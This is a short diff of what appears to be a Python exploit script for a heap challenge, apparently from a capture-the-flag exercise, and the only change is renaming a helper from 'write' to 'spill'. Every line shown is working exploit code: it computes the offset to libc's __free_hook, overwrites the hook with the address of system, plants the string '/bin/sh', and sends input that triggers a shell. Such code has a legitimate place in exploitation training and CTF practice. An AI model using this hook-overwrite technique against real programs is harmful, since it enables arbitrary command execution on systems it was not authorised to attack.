@@ -102,8 +102,8 @@ print "free_hook_ptr: %lx" % free_hook_ptr
 off = (free_hook_ptr - happa)
 print "Offset: %lx" % off
 
-write(off, p64(libc + libc_elf.symbols["system"]))
-write(0x20, "/bin/sh\x00") #A
+spill(off, p64(libc + libc_elf.symbols["system"]))
+spill(0x20, "/bin/sh\x00") #A
 
 p.sendline("NOM-NOM")
 p.sendline(0x20) #A -- open shell
